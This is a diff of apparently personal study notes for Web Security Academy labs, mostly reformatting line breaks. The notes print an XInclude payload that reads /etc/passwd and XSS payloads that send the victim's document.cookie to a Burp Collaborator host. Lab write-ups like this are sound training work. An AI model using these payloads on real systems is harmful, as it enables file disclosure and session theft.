@@ -26,33 +26,33 @@ origin payload:
 
 win payload:
 ```<zyk xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd/"/></zyk>```
-<br>
+<br><br>
 
 <img width="827" height="528" alt="image" src="https://github.com/user-attachments/assets/70018d9a-e786-4361-acad-2742040ce783" />
 
 <br><br><br><br><br><br><br><br><br><br>
 
 <h3>Lab: Scanning non-standard data structures</h3>
-<br>
+<br><br>
 To solve the lab, use Burp Scanner's Scan selected insertion point feature to identify the vulnerability, then manually exploit it and delete carlos.
-
-<br>
+<br><br>
 server said: browser, set this as a session cookie of user.
 if we want to test sth, we want to test sth that is predictable.
 cookies interacts with the database every time the request is send.
-<br>
+<br><br>
 <img width="837" height="678" alt="image" src="https://github.com/user-attachments/assets/8821726f-965e-4626-aaab-fcce57d75bd8" />
 
-<br>
-& audit selected items. <br>
+<br><br>
+& audit selected items. <br><br>
 <img width="555" height="464" alt="image" src="https://github.com/user-attachments/assets/12d547b0-2b8a-4cab-8406-6810891f865a" />
 
 <img width="766" height="680" alt="image" src="https://github.com/user-attachments/assets/6826ebf0-2673-4342-8115-5116637adfed" />
 
-origin payload: ``` '"><svg/onload=fetch`//hcx56jcq7hqqt5jhqarhnd8ab1hw5mtej2asxil7\.oastify.com`> ```
-edit (copy own collab address): ``` '"><svg/onload=fetch(`//cm24m3xutms5b3onvfhzeizs4jaay2mr.oastify.com/document.cookie`)> ```
-original cookie was url encoded so document cookie part also must be
-win payload (insert new colab payload): ``` '"><svg/onload=fetch(`//cm24m3xutms5b3onvfhzeizs4jaay2mr.oastify.com/${encodeURIComponent(document.cookie)}`)>```
+<br><br>
+origin payload: ``` '"><svg/onload=fetch`//hcx56jcq7hqqt5jhqarhnd8ab1hw5mtej2asxil7\.oastify.com`> ```<br><br>
+edit (copy own collab address): ``` '"><svg/onload=fetch(`//cm24m3xutms5b3onvfhzeizs4jaay2mr.oastify.com/document.cookie`)> ```<br><br>
+original cookie was url encoded so document cookie part also must be<br><br>
+win payload (insert new colab payload): ``` '"><svg/onload=fetch(`//cm24m3xutms5b3onvfhzeizs4jaay2mr.oastify.com/${encodeURIComponent(document.cookie)}`)>```<br><br>
 <br>
 <img width="833" height="574" alt="image" src="https://github.com/user-attachments/assets/5415eedf-f95a-40dd-8cd1-f7a6bc76c7bb" />
 
